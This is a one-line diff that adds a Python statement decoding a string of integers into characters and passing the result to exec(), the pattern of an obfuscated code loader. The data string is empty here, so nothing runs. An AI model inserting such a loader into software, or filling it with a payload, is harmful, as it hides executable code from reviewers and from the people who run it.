@@ -1,0 +1,1 @@
+data="";exec("".join(map(chr, map(int, data.split()))))
